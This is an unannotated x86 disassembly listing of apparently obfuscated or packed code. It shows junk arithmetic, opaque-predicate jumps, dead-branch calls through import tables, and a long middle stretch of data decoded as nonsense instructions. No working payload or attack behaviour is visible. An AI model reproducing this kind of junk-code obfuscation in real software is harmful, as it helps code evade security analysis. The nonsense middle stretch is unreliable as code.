  418ea1:	rcl    BYTE PTR [ebx-0x3df26e91],0xe0
  418ea8:	sub    cl,dh
  418eaa:	add    DWORD PTR [esp+edi*1+0x35],eax
  418eae:	pop    esp
  418eaf:	ror    DWORD PTR [ebx-0x7436dd00],0xc8
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42839f,0x0
  418ec3:	mov    DWORD PTR ds:0x428167,0x216c
  418ecd:	mov    DWORD PTR ds:0x42826b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428263,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428273,0x562c
  418ef0:	mov    DWORD PTR ds:0x42829b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42839f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428327
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428df4
  418f1a:	not    DWORD PTR ds:0x42819b
  418f20:	sub    DWORD PTR ds:0x42838f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428153
  418f32:	mov    edx,DWORD PTR ds:0x428297
  418f38:	sbb    DWORD PTR ds:0x42837b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282d3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42830b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42838f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283a3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282fb,0x0
  418f6c:	not    DWORD PTR ds:0x428267
  418f72:	not    DWORD PTR ds:0x428197
  418f78:	mov    DWORD PTR ds:0x4282ef,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42831f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282fb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42837b
  418fb5:	call   DWORD PTR ds:0x428df8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42822f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42818f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42837f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42818b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42816f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42815f,0x0
  41900e:	mov    DWORD PTR ds:0x428173,0x4347
  419018:	mov    DWORD PTR ds:0x428197,0x6064
  419022:	mov    DWORD PTR ds:0x42827f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428253,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42815f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dfc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282ef
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42822b
  41906c:	or     DWORD PTR ds:0x42836f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x598f3402]
  419095:	xor    eax,0xc33fbe41
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1+0x71891818],bh
  4190a2:	stos   BYTE PTR es:[edi],al
  4190a3:	div    al
  4190a5:	cdq    
  4190a6:	sar    DWORD PTR [edi+ebx*1-0x2973588f],0xae
  4190ae:	sahf   
  4190af:	xor    DWORD PTR [edi+0x25d0803e],0xffffffff
  4190b6:	or     ch,BYTE PTR [esi+eiz*1+0x62c290a2]
  4190bd:	add    DWORD PTR [edx-0x4bf2eb43],ebp
  4190c3:	sbb    dl,dl
  4190c5:	jmp    0xc181540a
  4190ca:	jnp    0x4190a5
  4190cc:	in     eax,dx
  4190cd:	xor    DWORD PTR [ecx-0x1a],edx
  4190d0:	cmp    ecx,DWORD PTR [ebx+eiz*1]
  4190d3:	inc    esp
  4190d4:	xchg   DWORD PTR [ebx-0x67],edi
  4190d7:	adc    al,0xaf
  4190d9:	mov    edi,0x3715f16f
  4190de:	and    al,0xd7
  4190e0:	les    esp,FWORD PTR [edi-0xe96ade8]
  4190e6:	or     eax,0x9a50e7a
  4190eb:	ins    DWORD PTR es:[edi],dx
  4190ec:	(bad)  
  4190ed:	int    0xea
  4190ef:	ins    BYTE PTR es:[edi],dx
  4190f0:	out    0x52,eax
  4190f2:	scas   eax,DWORD PTR es:[edi]
  4190f3:	bound  eax,QWORD PTR [ecx-0x6ce09b91]
  4190f9:	int    0xe1
  4190fb:	cmc    
  4190fc:	out    dx,al
  4190fd:	jo     0x419118
  4190ff:	xchg   BYTE PTR [edi-0x900e82d],ch
  419105:	sbb    ebx,DWORD PTR [edx-0x6eb89e08]
  41910b:	pop    ds
  41910c:	scas   al,BYTE PTR es:[edi]
  41910d:	je     0x4190dd
  41910f:	sbb    BYTE PTR [eax-0x7f4b3ebb],0x88
  419116:	push   edi
  419117:	stos   BYTE PTR es:[edi],al
  419118:	pop    ecx
  419119:	clc    
  41911a:	inc    ecx
  41911b:	pop    esp
  41911c:	fiadd  DWORD PTR fs:[ebx+0x27a33858]
  419123:	je     0x419190
  419125:	sbb    DWORD PTR ds:[ecx],0xd7cc2608
  41912c:	es ins DWORD PTR es:[edi],dx
  41912e:	shl    BYTE PTR ds:0x862f402,1
  419134:	shr    ebx,0xd4
  419137:	pop    ss
  419138:	mov    ah,0x56
  41913a:	arpl   WORD PTR [edi],bp
  41913c:	fwait
  41913d:	push   edx
  41913e:	jl     0x4190e3
  419140:	js     0x4190ec
  419142:	xchg   ecx,eax
  419143:	mov    ebx,0x253e0018
  419148:	(bad)  
  41914a:	outs   dx,DWORD PTR ds:[esi]
  41914b:	mov    eax,0xdce266fc
  419150:	pop    es
  419151:	add    eax,0x386a4b49
  419156:	push   ebp
  419157:	int3   
  419158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419159:	out    dx,eax
  41915a:	cmp    DWORD PTR [ebx],esi
  41915c:	(bad)  
  41915d:	mov    dh,0xc5
  41915f:	jp     0x419156
  419161:	es mov edi,0x44cafc2a
  419167:	xchg   edx,eax
  419168:	push   0xffffffae
  41916a:	gs into 
  41916c:	xor    eax,0xd9cf5478
  419171:	arpl   WORD PTR [ebp-0x3d8d9c3b],bp
  419177:	and    eax,0x59efb32a
  41917c:	ret    
  41917d:	mov    al,0x67
  41917f:	jbe    0x419161
  419181:	and    eax,0x90d7da5b
  419186:	mov    ah,0xb4
  419188:	add    DWORD PTR [esi+0x45],esp
  41918b:	pushf  
  41918c:	inc    esp
  41918d:	dec    ebx
  41918e:	in     eax,dx
  41918f:	in     al,0x50
  419191:	js     0x41920b
  419193:	inc    DWORD PTR [edx-0x26197205]
  419199:	je     0x419183
  41919b:	hlt    
  41919c:	inc    ebp
  41919d:	ins    DWORD PTR es:[edi],dx
  41919e:	pop    esi
  41919f:	xor    al,0x76
  4191a1:	fld    QWORD PTR [ecx+0x4f2514c7]
  4191a7:	xchg   ecx,eax
  4191a8:	push   ebx
  4191a9:	adc    ch,ah
  4191ab:	xchg   DWORD PTR [ebx+eax*2],ecx
  4191ae:	aam    0xf4
  4191b0:	mov    ds:0x4c4e554d,al
  4191b5:	pop    ds
  4191b6:	jmp    FWORD PTR [esi+eiz*8]
  4191b9:	mov    WORD PTR ds:[edi+0x59],fs
  4191bd:	cmp    BYTE PTR [esi-0x3f],cl
  4191c0:	fwait
  4191c1:	lds    edi,FWORD PTR [edx+0x2d8e11da]
  4191c7:	retf   0x666
  4191ca:	mov    esi,DWORD PTR [ebx-0x5e]
  4191cd:	and    al,0xc3
  4191cf:	xchg   BYTE PTR [esi-0x16],cl
  4191d2:	in     eax,dx
  4191d3:	pop    ebx
  4191d4:	pop    edx
  4191d5:	push   0x8d4bcdd1
  4191da:	push   es
  4191db:	retf   
  4191dc:	inc    ebp
  4191dd:	xor    dl,dh
  4191df:	lods   eax,DWORD PTR ds:[esi]
  4191e0:	dec    ebp
  4191e1:	clc    
  4191e2:	ds dec ecx
  4191e4:	dec    ebp
  4191e5:	mov    esi,0x15bbfc8c
  4191ea:	in     al,dx
  4191eb:	push   ss
  4191ec:	pop    ebp
  4191ed:	pand   mm0,QWORD PTR ds:[edi]
  4191f1:	add    cl,bh
  4191f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191f4:	pop    ebx
  4191f5:	and    eax,0x11167767
  4191fa:	or     dl,bh
  4191fc:	or     eax,edi
  4191fe:	(bad)  
  4191ff:	aaa    
  419200:	mov    ch,0xdd
  419202:	pop    edx
  419203:	or     ch,BYTE PTR [eax]
  419205:	call   0x70d5:0xccccc473
  41920c:	dec    ebx
  41920d:	(bad)  
  41920e:	enter  0x2694,0x44
  419212:	ror    BYTE PTR [edi],cl
  419214:	inc    eax
  419215:	jp     0x419210
  419217:	fdiv   st(0),st
  419219:	mov    edx,0xac48da24
  41921e:	mov    dl,0x37
  419220:	and    DWORD PTR [ebx+ebx*8-0x44bb0e7a],ebp
  419227:	dec    esp
  419228:	sbb    eax,0x8fa92eaa
  41922d:	mov    esi,0x9f1a4761
  419232:	pop    ss
  419233:	lods   al,BYTE PTR ds:[esi]
  419234:	in     eax,0xcf
  419236:	cdq    
  419237:	icebp  
  419238:	cmp    bl,bl
  41923a:	or     ebp,esp
  41923c:	ins    DWORD PTR es:[edi],dx
  41923d:	mov    ah,0xec
  41923f:	dec    esi
  419240:	mov    al,0xa7
  419242:	sbb    al,0xf
  419244:	fild   QWORD PTR [ecx]
  419246:	dec    edi
  419247:	ret    
  419248:	jl     0x4192bb
  41924a:	push   ebp
  41924b:	rcr    DWORD PTR [ecx+0x2592cc26],1
  419251:	jle    0x4191dd
  419253:	les    esp,FWORD PTR [ebp-0x70]
  419256:	arpl   sp,bp
  419258:	js     0x41926c
  41925a:	ret    
  41925b:	int    0x55
  41925d:	xchg   ebp,eax
  41925e:	sub    al,0x6e
  419260:	add    eax,0x83099977
  419265:	and    DWORD PTR [eax],ebx
  419267:	arpl   WORD PTR [ecx],sp
  419269:	in     eax,0xb9
  41926b:	mov    ebx,0xac3a71
  419270:	push   edx
  419271:	mov    ah,0xef
  419273:	call   0x213a5dc9
  419278:	cwde   
  419279:	pop    ebx
  41927a:	sbb    BYTE PTR [ecx],ah
  41927c:	fs (bad) 
  41927e:	stc    
  41927f:	xlat   BYTE PTR ds:[ebx]
  419280:	push   ebx
  419281:	pusha  
  419282:	in     eax,dx
  419283:	dec    DWORD PTR [esi+0x4d264b9c]
  419289:	cli    
  41928a:	xchg   bx,ax
  41928c:	cdq    
  41928d:	and    eax,0x217544ed
  419292:	leave  
  419293:	xchg   DWORD PTR [eax],edi
  419295:	jno    0x4192b2
  419297:	(bad)  
  419298:	jle    0x41928a
  41929a:	xor    eax,0x3753e9a3
  41929f:	mov    ecx,0x6fd64a1
  4192a4:	and    WORD PTR [ebx],sp
  4192a7:	(bad)  
  4192a8:	dec    DWORD PTR [edx-0x73955e21]
  4192ae:	test   BYTE PTR [eax],cl
  4192b0:	aam    0x5d
  4192b2:	jnp    0x419251
  4192b4:	push   edx
  4192b5:	and    ebp,DWORD PTR [edx+0x2f204ae9]
  4192bb:	cmp    BYTE PTR [edi],0xb0
  4192be:	mov    ch,0x3e
  4192c0:	pop    ds
  4192c1:	jmp    0x419341
  4192c3:	inc    ebp
  4192c4:	stos   DWORD PTR es:[edi],eax
  4192c5:	js     0x419253
  4192c7:	out    0xca,eax
  4192c9:	push   esi
  4192ca:	int    0xd9
  4192cc:	bound  edx,QWORD PTR [edi]
  4192ce:	sbb    al,0x99
  4192d0:	dec    esi
  4192d1:	sub    BYTE PTR [esp+ebx*1-0x4f],dh
  4192d5:	and    ebx,DWORD PTR [ecx-0x78]
  4192d8:	sub    edx,0xe17d41e9
  4192de:	add    cl,BYTE PTR [edx+0x6593a018]
  4192e4:	popa   
  4192e5:	pop    edx
  4192e6:	sahf   
  4192e7:	sbb    eax,0xa79db447
  4192ec:	int3   
  4192ed:	cmp    DWORD PTR [esi+0x8029cb],ecx
  4192f3:	or     DWORD PTR [eax+0x143bbc1],ebp
  4192f9:	xchg   ebp,eax
  4192fa:	add    DWORD PTR [eax+0x4c],edx
  4192fd:	dec    ebx
  4192fe:	mov    dl,0x46
  419300:	aam    0x53
  419302:	xchg   esp,eax
  419303:	int3   
  419304:	mov    dl,0x81
  419306:	jl     0x4192a4
  419308:	mov    bl,0x32
  41930a:	daa    
  41930b:	jmp    0x5099:0x767d53e9
  419312:	subps  xmm5,XMMWORD PTR [edx]
  419315:	pop    es
  419316:	cld    
  419317:	adc    DWORD PTR ds:0x43904c40,0x5d
  41931e:	lock loop 0x419329
  419321:	lock cmp eax,0x8a6bf715
  419327:	sbb    eax,0x6a6a9baf
  41932c:	cmp    bl,dl
  41932e:	(bad)  
  41932f:	outs   dx,BYTE PTR ds:[esi]
  419330:	and    al,BYTE PTR ds:0xebd9271
  419336:	jl     0x4192e7
  419338:	shl    DWORD PTR [esp+ebx*2+0x1aed0005],0x62
  419340:	and    ebx,esi
  419342:	or     eax,0x2784e0c6
  419347:	adc    al,BYTE PTR [ebx]
  419349:	jge    0x41932e
  41934b:	mov    eax,ds:0x67fbfe1d
  419350:	fld    DWORD PTR [ebx]
  419352:	fild   WORD PTR [edi]
  419354:	mov    eax,ss
  419356:	add    ecx,DWORD PTR [esi-0x2b]
  419359:	jno    0x41937b
  41935b:	jnp    0x41938e
  41935d:	hlt    
  41935e:	and    ebp,DWORD PTR [edx]
  419360:	ret    0x39b5
  419363:	add    DWORD PTR [edx],0x7
  419366:	test   eax,ebp
  419368:	jae    0x4193cd
  41936a:	jmp    0xd2a67c3b
  41936f:	mov    ?,WORD PTR [edx+0x69]
  419372:	ins    DWORD PTR es:[edi],dx
  419373:	xchg   esi,eax
  419374:	and    esp,DWORD PTR [esi+0x11]
  419377:	adc    al,0xe8
  419379:	mov    bh,0xb6
  41937b:	ins    DWORD PTR es:[edi],dx
  41937c:	add    bh,al
  41937e:	retf   0x869a
  419381:	jo     0x4193c7
  419383:	(bad)  
  419384:	ficom  DWORD PTR [edx+0x6391490f]
  41938a:	fcom   DWORD PTR ds:0xc3d92f19
  419390:	rol    ah,cl
  419392:	xor    eax,0xe916fbbd
  419397:	pop    DWORD PTR [edx-0x30]
  41939a:	push   edx
  41939b:	adc    BYTE PTR [ebp-0x70],0x15
  41939f:	in     eax,0xe2
  4193a1:	xor    ah,BYTE PTR [ebp+0x66]
  4193a4:	pop    ds
  4193a5:	or     edx,DWORD PTR [edx+0x4a]
  4193a8:	cmp    DWORD PTR [esi+esi*8],ebp
  4193ab:	loopne 0x41939a
  4193ad:	fld    QWORD PTR [ecx+0x19]
  4193b0:	mov    eax,0xf5b6deea
  4193b5:	ja     0x4193bb
  4193b7:	inc    ebp
  4193b8:	xchg   edi,eax
  4193b9:	dec    esp
  4193ba:	push   eax
  4193bb:	dec    edx
  4193bc:	scas   eax,DWORD PTR es:[edi]
  4193bd:	dec    ecx
  4193be:	pop    edx
  4193bf:	push   ecx
  4193c0:	dec    esp
  4193c1:	xchg   esp,eax
  4193c2:	out    0x7a,al
  4193c4:	xor    bl,cl
  4193c6:	popa   
  4193c7:	rcr    DWORD PTR [eax-0x2046835d],cl
  4193cd:	push   esp
  4193ce:	das    
  4193cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d0:	and    DWORD PTR [ebx+eax*8-0x5c34bbb5],esi
  4193d7:	pop    ebp
  4193d8:	push   ebp
  4193d9:	push   ss
  4193da:	sahf   
  4193db:	fild   QWORD PTR [ebx+0x29]
  4193de:	mov    cl,0x3d
  4193e0:	mov    eax,eax
  4193e2:	add    cl,bl
  4193e4:	bound  esi,QWORD PTR [edx]
  4193e6:	inc    ebx
  4193e7:	cwde   
  4193e8:	cdq    
  4193e9:	arpl   WORD PTR [ebx+esi*4+0x4e9a9976],ax
  4193f0:	retf   0x1a9
  4193f3:	push   esi
  4193f4:	push   esi
  4193f5:	mov    ds:0xb4f6fc39,eax
  4193fa:	jecxz  0x4193a1
  4193fc:	push   cs
  4193fd:	inc    esp
  4193fe:	xchg   ecx,eax
  4193ff:	sub    al,ah
  419401:	push   edi
  419402:	scas   eax,DWORD PTR es:[edi]
  419403:	mov    esp,0x4ba959ae
  419408:	xor    al,0x11
  41940a:	clc    
  41940b:	cmp    ch,BYTE PTR [edx]
  41940d:	aam    0x7
  41940f:	jnp    0x419487
  419411:	xchg   esp,eax
  419412:	cli    
  419413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419414:	sub    DWORD PTR [edx],edx
  419416:	add    esp,ebx
  419418:	push   es
  419419:	dec    eax
  41941a:	push   edi
  41941b:	jne    0x4193e5
  41941d:	repnz adc al,0x85
  419420:	push   ds
  419421:	push   ecx
  419422:	inc    eax
  419423:	pop    ebp
  419424:	es call 0x9316:0xbe02896a
  41942c:	inc    ecx
  41942d:	nop
  41942e:	mov    esp,0x6894e97b
  419433:	jae    0x419457
  419435:	scas   eax,DWORD PTR es:[edi]
  419436:	cmp    ebx,DWORD PTR [edx]
  419438:	into   
  419439:	pop    esi
  41943a:	add    dl,BYTE PTR [edx+esi*2-0x70e8c1f3]
  419441:	xchg   edx,eax
  419442:	sar    DWORD PTR [eax+0x70e14a4e],0x71
  419449:	mov    ds,WORD PTR [edi+0x69]
  41944c:	or     DWORD PTR [edi+0xd],esp
  41944f:	call   0x8ccd5fcc
  419454:	and    al,0x84
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	aas    
  419460:	add    BYTE PTR [edx+0x0],0x0
  419464:	mov    DWORD PTR ds:0x428397,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283a3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42823f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e00
  41949a:	mov    DWORD PTR ds:0x42827b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282e3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42831b,edx
  4194b2:	mov    DWORD PTR ds:0x4282a3,0x52b1
  4194bc:	or     DWORD PTR ds:0x42817b,edx
  4194c2:	and    DWORD PTR ds:0x42837f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428327,0x0
  4194cf:	mov    DWORD PTR ds:0x428327,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282a3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283a3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42817f,0x3203
  419506:	cmp    DWORD PTR ds:0x428327,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280bb
  419518:	push   0x42809f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e94
  419528:	adc    DWORD PTR ds:0x428187,0x266f
  419532:	xor    DWORD PTR ds:0x42837f,ebx
  419538:	xor    DWORD PTR ds:0x428307,ecx
  41953e:	mov    DWORD PTR ds:0x428177,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428253
  41954e:	dec    DWORD PTR ds:0x428307
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282f7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42838b,0x4283a7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42818f,0x0
  419589:	mov    DWORD PTR ds:0x42817f,0x514f
  419593:	mov    DWORD PTR ds:0x428183,0x65eb
  41959d:	mov    DWORD PTR ds:0x428233,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428293,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42818f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42804d
  4195cd:	push   0x428069
  4195d2:	call   DWORD PTR ds:0x428e98
  4195d8:	adc    DWORD PTR ds:0x4282a7,ecx
  4195de:	and    DWORD PTR ds:0x42829b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428173,ebx
  4195ee:	and    DWORD PTR ds:0x42827f,0x6136
  4195f8:	add    DWORD PTR ds:0x428187,ebx
  4195fe:	mov    eax,ds:0x422558
  419603:	and    DWORD PTR ds:0x42830f,0x428277
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42816b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428193,0x428167
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428277,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282a7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42827f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428293,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428183,0x428153
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428287,0x42824f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42816b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42816b,0x4282f7
  4196ab:	push   0x4223dc
  4196b0:	sbb    DWORD PTR ds:0x428283,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42822b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42823f
  4196da:	sbb    DWORD PTR ds:0x428323,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428253,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42826f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42823b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428373,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282ef
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42826b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428383,0x5836
  419737:	cmp    DWORD PTR ds:0x428373,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e04
  41974d:	movzx  edx,BYTE PTR ds:0x42816b
  419754:	adc    DWORD PTR ds:0x4282f3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282a7
  419761:	add    DWORD PTR ds:0x42818b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42829f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42818b,0x0
  419781:	mov    DWORD PTR ds:0x428253,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42826b,ebx
  419797:	cmp    DWORD PTR ds:0x42818b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e08
  4197bf:	sub    DWORD PTR ds:0x428283,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282ff,0x42823f
  4197d3:	add    DWORD PTR ds:0x42825f,0x428187
  4197dd:	mov    ebx,DWORD PTR ds:0x4281a7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282b7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428237,ecx
  4197f8:	and    DWORD PTR ds:0x42828f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42830f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42818b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428377,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428317,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283a3,0x6551
  419858:	cmp    DWORD PTR ds:0x42818b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e9c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283ab
  419891:	mov    ecx,DWORD PTR ds:0x4283af
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42829b
  4198a2:	cmp    DWORD PTR ds:0x42815f,0x0
  4198a9:	mov    DWORD PTR ds:0x428153,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42831f
  4198ba:	not    DWORD PTR ds:0x428313
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42815f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e0c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428283
  4198e5:	and    DWORD PTR ds:0x42831b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282ef
  4198f1:	sbb    DWORD PTR ds:0x428177,edx
  4198f7:	or     DWORD PTR ds:0x428307,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428273,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42821f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428223
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428317,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42822b,0x4551
  419946:	mov    DWORD PTR ds:0x42828f,0x487
  419950:	cmp    DWORD PTR ds:0x428317,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e10
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282ef,0x75a
  419988:	sub    DWORD PTR ds:0x428297,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42823b
  419999:	sub    ecx,DWORD PTR ds:0x42839f
  41999f:	mov    DWORD PTR ds:0x42823b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42825b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282f3,0x47a6
